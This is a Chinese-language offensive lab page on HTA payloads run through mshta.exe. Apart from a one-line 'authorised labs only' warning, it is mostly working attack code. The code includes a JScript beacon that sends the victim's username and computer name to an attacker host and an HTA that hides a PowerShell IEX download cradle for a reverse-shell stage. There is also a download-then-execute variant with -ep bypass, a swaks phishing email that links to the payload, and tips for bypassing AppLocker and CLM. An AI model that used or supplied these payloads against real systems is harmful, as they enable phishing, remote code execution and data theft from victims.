# HTA

::: warning 仅供学习 / 授权实验
HTA 由 `mshta.exe` 执行。只在授权 lab / 考试环境投递。
:::

AppLocker 默认放行 `%SystemRoot%\System32\mshta.exe`，用户 EXE 往往不行。

## 无害回调

```html
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
function beacon(path) {
    try {
        var x = new ActiveXObject("MSXML2.XMLHTTP");
        x.open("GET", "http://LHOST" + path, false);
        x.send();
    } catch (e) {}
}
beacon("/cb?stage=hta-start");
var sh = new ActiveXObject("WScript.Shell");
var who = sh.ExpandEnvironmentStrings("%USERNAME%") + "@" +
          sh.ExpandEnvironmentStrings("%COMPUTERNAME%");
beacon("/cb?u=" + encodeURIComponent(who));
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
```

日志必须先后出现 `GET /xxx.hta` 和 `GET /cb`。

## 拉 PowerShell 第二阶段

`shell.ps1` 用 [载荷与监听](/lab/payloads) 里的反向 TCP，放在同一 HTTP 根。

```html
<html>
<head>
<title>Loading</title>
<HTA:APPLICATION SCROLL="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
<script language="JScript">
function beacon(path) {
    try {
        var x = new ActiveXObject("MSXML2.XMLHTTP");
        x.open("GET", "http://LHOST" + path, false);
        x.send();
    } catch (e) {}
}
beacon("/cb?stage=hta-start");
var sh = new ActiveXObject("WScript.Shell");
var url = "http://LHOST/shell.ps1";
var cmd = "powershell.exe -nop -w hidden -Command " +
          "\"IEX((New-Object Net.WebClient).DownloadString('" + url + "'))\"";
var rc = sh.Run(cmd, 0, true);
beacon("/cb?stage=iex-rc&rc=" + rc);
</script>
</head>
<body>
<script language="JScript">window.close();</script>
</body>
</html>
```

引号容易写崩。稳妥：PowerShell 整段 UTF-16LE base64 后只用 `-enc`。

## 下载和执行拆开

合在一起没反应时，先落盘再执行：

```javascript
var sh = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var dest = sh.ExpandEnvironmentStrings("%TEMP%") + "\\s.ps1";
var http = new ActiveXObject("MSXML2.XMLHTTP");
http.open("GET", "http://LHOST/shell.ps1", false);
http.send();
var f = fso.CreateTextFile(dest, true);
f.Write(http.responseText);
f.Close();
beacon("/cb?stage=written");
sh.Run("powershell.exe -nop -w hidden -ep bypass -f " + dest, 0, true);
```

每步打 beacon，看卡在下载、写入还是执行。

## 邮件

```bash
swaks --body 'Please see http://LHOST/note.hta' \
  --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
  --header "Subject: lab" -t USER@DOMAIN -f sender@lab --server SMTP
```

附件 `.hta` 常被网关丢掉，优先链接。也可诱导：

```text
C:\Windows\System32\mshta.exe http://LHOST/note.hta
```

## CLM / AppLocker 同时开

`powershell.exe` 在 CLM 里时，不要反复换 IEX 混淆。改用 InstallUtil 加载托管程序集，见 [AppLocker 与 AMSI](/topics/applocker-amsi)。HTA 只负责：写 `.cs` → `csc` → `InstallUtil /U`。

位数：`System32\mshta.exe` = 64 位；需要 32 位走 `SysWOW64\mshta.exe`。

## 失败

| 现象 | 做法 |
|---|---|
| 只有 GET hta 没有 /cb | 脚本没跑；看窗口/ActiveX |
| 有 /cb 没有 GET shell.ps1 | Run 命令引号坏了，或 PS 被拦 |
| 有 GET ps1 无会话 | AMSI / 第二阶段 LHOST 错 |
| 合一起失败拆开可以 | 时序，不是杀软 |
